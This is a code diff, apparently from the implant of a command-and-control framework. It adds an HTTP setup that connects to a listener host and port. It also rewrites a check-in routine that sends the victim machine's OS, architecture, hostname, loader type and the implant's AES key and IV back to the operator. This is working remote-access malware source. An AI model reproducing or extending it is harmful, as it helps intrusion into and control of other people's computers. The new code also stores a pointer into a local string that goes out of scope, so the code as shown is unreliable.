@@ -2,12 +2,23 @@
 
 namespace Handler
 {
-    std::wstring GetInitialInfoJSON()
+    VOID HTTPInit(State::PSTATE pState)
+    {
+		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+            pState->pProcs,
+            pState->lpListenerHost,
+            pState->nListenerPort
+        );
+
+        pState->hSession = handlers.hSession;
+        pState->hConnect = handlers.hConnect;
+    }
+
+    VOID GetInitialInfoJSON(State::PSTATE pState)
     {
         std::wstring wOS = L"windows";
         std::wstring wArch = L"";
         std::wstring wHostname = L"";
-        std::wstring wPayloadType = PAYLOAD_TYPE_W;
         std::wstring wAesKey = AES_KEY_BASE64_W;
         std::wstring wAesIV = AES_IV_BASE64_W;      
 
@@ -26,20 +37,20 @@ namespace Handler
             wHostname = Utils::Convert::UTF8Decode(sHostname);
         }
 
-        std::wstring wJson = L"{";
-        wJson += L"\"os\":\"" + wOS + L"\"";
-        wJson += L",";
-        wJson += L"\"arch\":\"" + wArch + L"\"";
-        wJson += L",";
-        wJson += L"\"hostname\":\"" + wHostname + L"\"";
-        wJson += L",";
-        wJson += L"\"loaderType\":\"" + wPayloadType + L"\"";
-        wJson += L",";
-        wJson += L"\"aesKey\":\"" + wAesKey + L"\"";
-        wJson += L",";
-        wJson += L"\"aesIV\":\"" + wAesIV + L"\"";
-        wJson += L"}";
+        std::wstring wJSON = L"{";
+        wJSON += L"\"os\":\"" + wOS + L"\"";
+        wJSON += L",";
+        wJSON += L"\"arch\":\"" + wArch + L"\"";
+        wJSON += L",";
+        wJSON += L"\"hostname\":\"" + wHostname + L"\"";
+        wJSON += L",";
+        wJSON += L"\"loaderType\":\"" + std::wstring(pState->lpPayloadType) + L"\"";
+        wJSON += L",";
+        wJSON += L"\"aesKey\":\"" + wAesKey + L"\"";
+        wJSON += L",";
+        wJSON += L"\"aesIV\":\"" + wAesIV + L"\"";
+        wJSON += L"}";
 
-        return wJson;
+        pState->lpInfoJSON = wJSON.c_str();
     }
 }
